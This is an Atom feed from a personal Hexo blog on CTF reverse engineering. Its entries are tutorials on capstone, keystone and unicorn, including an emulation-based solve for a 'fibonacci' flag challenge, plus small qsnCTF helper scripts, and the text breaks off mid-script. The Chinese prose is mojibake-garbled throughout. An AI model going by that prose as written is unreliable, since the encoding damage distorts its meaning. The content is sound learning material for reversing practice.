<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>èƒ½æ‰“ä¸€è¾ˆå­CTFå—ï¼Ÿ</title>
  <icon>https://www.gravatar.com/avatar/260de78781b3355b5fcbb52d09a7a2a9</icon>
  <subtitle>å‘œå‘œä»€ä¹ˆæ—¶å€™èƒ½æˆä¸ºå‰å®³çš„ä¼šäºŒè¿›åˆ¶çš„å¤§äººå•Š</subtitle>
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/atom.xml" rel="self"/>
  
  <link href="https://github.com/xyy9233/xyy9233.github.io.git/"/>
  <updated>2024-03-02T08:40:36.801Z</updated>
  <id>https://github.com/xyy9233/xyy9233.github.io.git/</id>
  
  <author>
    <name>wind_9233</name>
    <email>1768765226@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>capstoneã€keystoneä¸unicorn-1</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/01/capstone%E3%80%81keystone%E4%B8%8Eunicorn-1/</id>
    <published>2024-02-29T16:00:00.000Z</published>
    <updated>2024-03-02T08:40:36.801Z</updated>
    
    <content type="html"><![CDATA[<h1 id="capstoneã€keystoneä¸unicorn-1"><a href="#capstoneã€keystoneä¸unicorn-1" class="headerlink" title="capstoneã€keystoneä¸unicorn-1"></a>capstoneã€keystoneä¸unicorn-1</h1><h2 id="capstone"><a href="#capstone" class="headerlink" title="capstone"></a><strong>capstone</strong></h2><p>åŠ å¡å—æ´‹ç†å·¥å¤§å­¦å›¢é˜Ÿåœ¨ Blackhat USA 2014 ä¸Šå‘å¸ƒçš„ä¸€ä¸ªåæ±‡ç¼–å¼•æ“ã€‚</p><p>å®‰è£…ï¼š pip install capstone</p><h3 id="åŸºç¡€ç¤ºä¾‹"><a href="#åŸºç¡€ç¤ºä¾‹" class="headerlink" title="åŸºç¡€ç¤ºä¾‹"></a><strong>åŸºç¡€ç¤ºä¾‹</strong></h3><p>capstone çš„ API ä½¿ç”¨èµ·æ¥éå¸¸ç®€å•ï¼Œå› æ­¤ä½¿ç”¨è¯¥æ¡†æ¶ç¼–å†™å·¥å…·éå¸¸å®¹æ˜“ã€‚ ä¸‹é¢çš„ä»£ç åæ±‡ç¼–ä¸€äº› x86æœºå™¨ç ï¼Œå¹¶æ‰“å°å‡ºæ±‡ç¼–è¯­å¥ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> insn <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(insn.address, insn.mnemonic, insn.op_str))</span><br><span class="line">   </span><br><span class="line"><span class="comment">#0x1000:pushrbp</span></span><br><span class="line"><span class="comment">#0x1001:movrax, qword ptr [rip + 0x13b8]</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯æ¯ä¸€è¡Œä»£ç çš„è§£é‡Šï¼š</p><p>ç¬¬ 1 è¡Œï¼šå¯¼å…¥ Python æ¨¡å— capstoneã€‚</p><p>ç¬¬ 3 è¡Œï¼šè¦åæ±‡ç¼–çš„åŸå§‹äºŒè¿›åˆ¶ä»£ç ã€‚</p><p>ç¬¬ 5 è¡Œï¼šä½¿ç”¨ç±» Cs ä¸º capstone åˆå§‹åŒ– Python ç±»ã€‚ éœ€è¦ç»™è¿™ä¸ªç±»ä¸¤ä¸ªå‚æ•°ï¼šç¡¬ä»¶æ¶æ„å’Œç¡¬ä»¶æ¨¡å¼ã€‚</p><p>åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬è¦åæ±‡ç¼– x86 ä½“ç³»ç»“æ„çš„ 64 ä½ä»£ç ã€‚</p><p>ç¬¬ 6 è¡Œï¼šä½¿ç”¨ä¸Šé¢åˆ›å»ºçš„ Cs ç±»å®ä¾‹çš„æ–¹æ³• disasm() åæ±‡ç¼–äºŒè¿›åˆ¶ä»£ç ã€‚ disasm çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç¬¬ä¸€</p><p>æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œåœ¨æœ¬ä¾‹ä¸­ä¸º 0x1000ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œdisasm åæ±‡ç¼–æ‰€æœ‰ä»£ç ï¼Œç›´åˆ°æ²¡æœ‰æ›´å¤šä»£ç æˆ–é‡</p><p>åˆ°ä¸å¯è§£é‡Šçš„æŒ‡ä»¤ã€‚ disasm è¿”å›ä¸€ä¸ªç±»å‹ä¸º CsInsn çš„æŒ‡ä»¤åˆ—è¡¨ï¼Œè¿™é‡Œçš„ for å¾ªç¯ä¼šè¿­ä»£è¿™ä¸ªåˆ—è¡¨ã€‚</p><p>ç¬¬ 7 è¡Œï¼šæ‰“å°å‡ºæ¯æ¡æŒ‡ä»¤çš„ä¸€äº›å†…éƒ¨ä¿¡æ¯ã€‚ CsInsn ç±»å…¬å¼€äº†åæ±‡ç¼–æŒ‡ä»¤çš„æ‰€æœ‰å†…éƒ¨ä¿¡æ¯ã€‚ ä¸‹é¢ä»‹ç»äº†</p><p>æ­¤ç±»ä¸­ä¸€äº›æœ€å¸¸ç”¨çš„å±æ€§ã€‚</p><p>&#x2F;&#x2F;&#x2F;æƒ³èµ·æ¥äº†</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># ä»æ–‡ä»¶ä¸­è¯»å–åå…­è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        hex_string = f.read().strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—</span></span><br><span class="line">    bytes_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†å­—èŠ‚åºåˆ—å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;11.txt&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;output&quot;</span>  <span class="comment"># è¾“å‡ºæ–‡ä»¶ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå› ä¸ºåå…­è¿›åˆ¶æ˜¯å­—èŠ‚æ•°æ®</span></span><br><span class="line"></span><br><span class="line">hex_to_file(input_file, output_file)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229202523536.png" alt="image-20240229202523536"></p><h3 id="æ›´é«˜æ•ˆçš„-API"><a href="#æ›´é«˜æ•ˆçš„-API" class="headerlink" title="æ›´é«˜æ•ˆçš„ API"></a><strong>æ›´é«˜æ•ˆçš„</strong> <strong>API</strong></h3><p>ä¸Šä¸ªç¤ºä¾‹ä¸­ä½¿ç”¨ disasm() æ–¹æ³•è·å– CsInsn å¯¹è±¡ã€‚è¿™æä¾›äº†å¯ç”¨äºåæ±‡ç¼–æŒ‡ä»¤çš„å®Œæ•´ä¿¡æ¯ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åªéœ€è¦åœ°å€ã€å¤§å°ã€åŠ©è®°ç¬¦å’Œ op_str ç­‰åŸºæœ¬æ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ›´è½»é‡çº§çš„ API disasm_lite ã€‚</p><p>ä¸‹é¢æ˜¯ disasm_lite ç¤ºä¾‹</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> address, size, mnemonic, op_str <span class="keyword">in</span> md.disasm_lite(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(address, mnemonic, op_str))</span><br></pre></td></tr></table></figure><h3 id="æ¶æ„å’Œæ¨¡å¼"><a href="#æ¶æ„å’Œæ¨¡å¼" class="headerlink" title="æ¶æ„å’Œæ¨¡å¼"></a><strong>æ¶æ„å’Œæ¨¡å¼</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204045467.png" alt="image-20240229204045467"></p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229204054519.png" alt="image-20240229204054519"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line">CODE = <span class="string">b&quot;\x56\x34\x21\x34\xc2\x17\x01\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_MIPS, CS_MODE_MIPS64 + CS_MODE_LITTLE_ENDIAN)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><h2 id="keystone"><a href="#keystone" class="headerlink" title="keystone"></a><strong>keystone</strong></h2><p>pip install keystone-engine</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;mov eax, 3 \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub edx, eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><p>æ¯è¡Œä»£ç çš„æ³¨é‡Šï¼š</p><p>ç¬¬ 1 è¡Œï¼šåœ¨ä½¿ç”¨ä¹‹å‰å¯¼å…¥ keystone æ¨¡å—ã€‚</p><p>ç¬¬ 3-5 è¡Œï¼šè¦ç¼–è¯‘çš„æ±‡ç¼–å­—ç¬¦ä¸²ã€‚ æ­¤ç¤ºä¾‹ä¸­çš„ä»£ç æ˜¯ x86 32 ä½ï¼Œé‡‡ç”¨ Intel æ ¼å¼ã€‚ å¯ä»¥ç”¨ ; æˆ–</p><p>\n åˆ†éš”æ­¤å­—ç¬¦ä¸²ä¸­çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p><p>ç¬¬ 7 è¡Œï¼šä½¿ç”¨ç±» <strong>Ks</strong> åˆå§‹åŒ– keystoneã€‚ è¿™ä¸ªç±»æ¥å— 2 ä¸ªå‚æ•°ï¼šç¡¬ä»¶æ¶æ„å’Œç¡¬ä»¶æ¨¡å¼ã€‚ æ­¤ç¤ºä¾‹å¤„ç†</p><p>x86 ä½“ç³»ç»“æ„çš„ 32 ä½ä»£ç ã€‚</p><p>ç¬¬ 8 è¡Œï¼šä½¿ç”¨æ–¹æ³• <strong>asm</strong> ç¼–è¯‘æ±‡ç¼–æŒ‡ä»¤ã€‚ è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªç¼–ç å­—èŠ‚åˆ—è¡¨ï¼Œä»¥åŠ keystone åœ¨ç¼–è¯‘è¿‡</p><p>ç¨‹ä¸­å¤„ç†çš„è¾“å…¥è¯­å¥çš„æ•°é‡ã€‚</p><p>ç¬¬ 9 è¡Œï¼šæ‰“å°å‡ºæŒ‡ä»¤ç¼–ç å’Œå¤„ç†çš„æ±‡ç¼–è¯­å¥æ•°ã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œkeystone æ¥å—é‡‡ç”¨ Intel è¯­æ³•çš„ x86 æ±‡ç¼–ã€‚ å¦‚æœè¦å¤„ç† x86 AT&amp;T è¯­æ³•ï¼Œå¯ä»¥ç®€å•åœ°åˆ‡æ¢åˆ°è¯­æ³• AT&amp;Tï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line">code = <span class="string">&quot;movl $3, %eax \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;sub %eax, %edx \n&quot;</span> \</span><br><span class="line"><span class="string">&quot;jmp *%edx&quot;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_32)</span><br><span class="line">ks.syntax = KS_OPT_SYNTAX_ATT <span class="comment"># æ·»åŠ æ­¤è¡Œ</span></span><br><span class="line">encoding, count = ks.asm(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s (number of statements: %u)&quot;</span> %(encoding, count))</span><br></pre></td></tr></table></figure><h3 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a><strong>unicorn</strong></h3><p>unicorn å¼•æ“çš„ç”¨å¤„ï¼š</p><ul><li><p>ä»æ¶æ„è½¯ä»¶ä¸­è°ƒç”¨ä¸€ä¸ªæœ‰è¶£çš„å‡½æ•°ï¼Œè€Œä¸ä¼šåˆ›å»ºæœ‰å®³çš„è¿›ç¨‹</p></li><li><p>è§£å†³ CTF èµ›é¢˜</p></li><li><p>æ¨¡ç³Šæµ‹è¯•</p></li><li><p>æ¨¡æ‹Ÿæ‰§è¡Œæ··æ·†ä»£ç </p></li></ul><h3 id="ä»»åŠ¡-1"><a href="#ä»»åŠ¡-1" class="headerlink" title="ä»»åŠ¡ 1"></a><strong>ä»»åŠ¡</strong> <strong>1</strong></h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å½“è¿è¡Œè¿™ä¸ªç¨‹åºæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°å®ƒè‡ªå·±ä¼šæ‰“å° flagï¼Œä½†é€Ÿåº¦éå¸¸æ…¢ï¼Œflag çš„æ¯ä¸ªä¸‹ä¸€ä¸ªå­—èŠ‚çš„è®¡ç®—é€Ÿåº¦è¶Šæ¥è¶Šæ…¢ã€‚è¿™æ„å‘³ç€æœ‰å¿…è¦ä¼˜åŒ–ç¨‹åºä»¥è·å¾— flag</span></span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># è¿™æ˜¯ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ unicorn æ¥å¯¹å…¶è¿›è¡Œä¼˜åŒ–ã€‚é¦–å…ˆå¯¼å…¥ unicorn æ¨¡å—å¹¶å®ä¾‹åŒ–ä¸€ä¸ª Uc å¯¹è±¡ï¼š</span></span><br><span class="line">mu = Uc(UC_ARCH_X86,UC_MODE_64)</span><br><span class="line"><span class="comment"># è¦ä½¿ç”¨ unicornï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨åˆå§‹åŒ–è™šæ‹Ÿå†…å­˜ã€‚ å¯¹äºè¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œéœ€è¦åœ¨æŸå¤„ç¼–å†™ä»£ç å¹¶åˆ†é…ä¸€ä¸ªå †æ ˆã€‚äºŒè¿›åˆ¶æ–‡ä»¶çš„åŸºå€æ˜¯ 0x400000ã€‚ å‡è®¾å †æ ˆå°†ä»åœ°å€ 0x0 å¼€å§‹ï¼Œå¤§å°ä¸º 1024*1024ã€‚</span></span><br><span class="line"><span class="comment"># æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨ mem_map æ–¹æ³•æ¥æ˜ å°„ä¸€ç‰‡å†…å­˜ã€‚</span></span><br><span class="line">BASE = <span class="number">0x400000</span></span><br><span class="line">STACK_ADDR = <span class="number">0x0</span></span><br><span class="line">STACK_SIZE = <span class="number">1024</span> * <span class="number">1024</span></span><br><span class="line">mu.mem_map(BASE, <span class="number">1024</span> * <span class="number">1024</span>)</span><br><span class="line">mu.mem_map(STACK_ADDR, STACK_SIZE)</span><br><span class="line"><span class="comment"># ç°åœ¨ï¼Œæˆ‘ä»¬éœ€è¦åœ¨åŸºåœ°å€åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±åƒåŠ è½½ç¨‹åºä¸€æ ·ï¼Œç„¶åå°† RSP è®¾ç½®ä¸ºæŒ‡å‘å †æ ˆçš„æœ«å°¾</span></span><br><span class="line">mu.mem_write(BASE, <span class="built_in">open</span>(<span class="string">&quot;./fibonacci&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - <span class="number">8</span>)</span><br><span class="line"><span class="comment"># æ¥æ·»åŠ ä¸€ä¸ª hook ç›‘å¬æ¨¡æ‹Ÿè¿‡ç¨‹ï¼Œçœ‹çœ‹æ˜¯å“ªä¸ªè¯­å¥äº§ç”Ÿäº†å†…å­˜è®¿é—®é”™è¯¯ï¼š</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> cs.disasm(mu.mem_read(address, size), <span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(address), ins.mnemonic, ins.op_str)</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line"><span class="comment"># æˆ‘ä»¬å¯ä»¥å¯åŠ¨ä»¿çœŸå¹¶è¿è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œä½†éœ€è¦çŸ¥é“èµ·å§‹åœ°å€æ˜¯ä»€ä¹ˆä»¥åŠä»¿çœŸå™¨åº”è¯¥åœ¨å“ªé‡Œåœæ­¢ã€‚è€ƒè™‘ä»åœ°å€ 0x4004E0 å¼€å§‹æ¨¡æ‹Ÿä»£ç ï¼ˆmain å‡½æ•°é¦–åœ°å€ï¼‰ï¼Œç»“å°¾å¯ä»¥æ˜¯ 0x400575ï¼š</span></span><br><span class="line">mu.emu_start(<span class="number">0x4004E0</span>, <span class="number">0x400575</span>)</span><br><span class="line"><span class="comment"># è¿è¡Œå´äº§ç”Ÿäº†æŠ¥é”™ï¼š</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;Traceback (most recent call last):</span></span><br><span class="line"><span class="string">File &quot;solve.py&quot;, line 15, in &lt;module&gt;</span></span><br><span class="line"><span class="string">mu.emu_start(0x4004E0, 0x400575)</span></span><br><span class="line"><span class="string">File &quot;python38\lib\site-packages\unicorn\unicorn.py&quot;, line 547, in emu_start</span></span><br><span class="line"><span class="string">raise UcError(status)</span></span><br><span class="line"><span class="string">unicorn.unicorn.UcError: Invalid memory read (UC_ERR_READ_UNMAPPED)&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;è¿™æ®µä»£ç æ·»åŠ äº†ä¸€ä¸ªé’©å­ã€‚æˆ‘ä»¬å®šä¹‰äº†è‡ªå·±çš„å‡½æ•° hook_codeï¼Œå®ƒåœ¨æ¯æ¡æŒ‡ä»¤çš„ä»¿çœŸä¹‹å‰è¢«è°ƒç”¨ã€‚å®ƒéœ€</span></span><br><span class="line"><span class="string">è¦ä»¥ä¸‹å‚æ•°ï¼š</span></span><br><span class="line"><span class="string">Uc å®ä¾‹</span></span><br><span class="line"><span class="string">æŒ‡ä»¤åœ°å€</span></span><br><span class="line"><span class="string">æŒ‡ä»¤å¤§å°</span></span><br><span class="line"><span class="string">ç”¨æˆ·æ•°æ®ï¼ˆæˆ‘ä»¬å¯ä»¥åœ¨ hook_add() çš„å¯é€‰å‚æ•°ä¸­ä¼ é€’è¿™ä¸ªå€¼ï¼‰&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># æ·»åŠ çš„åœ¨é‡Œé¢äº†</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;0x4004e0 push rbp</span></span><br><span class="line"><span class="string">0x4004e1 push rbx</span></span><br><span class="line"><span class="string">0x4004e2 xor esi, esi</span></span><br><span class="line"><span class="string">0x4004e4 mov ebp, 0x4007e1</span></span><br><span class="line"><span class="string">0x4004e9 xor ebx, ebx</span></span><br><span class="line"><span class="string">0x4004eb sub rsp, 0x18</span></span><br><span class="line"><span class="string">0x4004ef mov rdi, qword ptr [rip + 0x200b42]</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240229212524751.png" alt="image-20240229212524751"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line"><span class="keyword">if</span> address <span class="keyword">in</span> [<span class="number">0x4004EF</span>, <span class="number">0x4004F6</span>, <span class="number">0x400502</span>, <span class="number">0x40054F</span>, <span class="number">0x400560</span>]:</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address + size)</span><br><span class="line"><span class="keyword">if</span> address == <span class="number">0x400560</span>:</span><br><span class="line">value = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(value))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;capstoneã€keystoneä¸unicorn-1&quot;&gt;&lt;a href=&quot;#capstoneã€keystoneä¸unicorn-1&quot; class=&quot;headerlink&quot; title=&quot;capstoneã€keystoneä¸unicorn-1&quot;&gt;&lt;/a&gt;capst</summary>
      
    
    
    
    
    <category term="é€†å‘ã€ä¹" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/%E9%80%86%E5%90%91%E3%80%81%E4%B9%90/"/>
    
  </entry>
  
  <entry>
    <title>qsnCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/29/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/</id>
    <published>2024-02-28T16:00:00.000Z</published>
    <updated>2024-03-02T08:34:15.806Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ†å‡ºå­—èŠ‚ç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_columns</span>(<span class="params">input_file, output_file, start_column, end_column</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> input_f:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> input_f:</span><br><span class="line">                <span class="comment"># æå–æŒ‡å®šåˆ—çš„å­—ç¬¦å¹¶å†™å…¥è¾“å‡ºæ–‡ä»¶</span></span><br><span class="line">                extracted_text = line[start_column - <span class="number">1</span>:end_column]  <span class="comment"># Python çš„ç´¢å¼•ä»0å¼€å§‹ï¼Œæ‰€ä»¥éœ€è¦å‡1</span></span><br><span class="line">                output_f.write(extracted_text + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&#x27;./22.txt&#x27;</span></span><br><span class="line">output_file = <span class="string">&#x27;./11.txt&#x27;</span></span><br><span class="line">start_column = <span class="number">21</span></span><br><span class="line">end_column = <span class="number">68</span></span><br><span class="line"></span><br><span class="line">extract_columns(input_file, output_file, start_column, end_column)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€†è½¬</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_content</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> input_f:</span><br><span class="line">        content = input_f.read()</span><br><span class="line"></span><br><span class="line">    reversed_content = content[::-<span class="number">1</span>]  <span class="comment"># ä½¿ç”¨åˆ‡ç‰‡æ“ä½œé€†è½¬å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:</span><br><span class="line">        output_f.write(reversed_content)</span><br><span 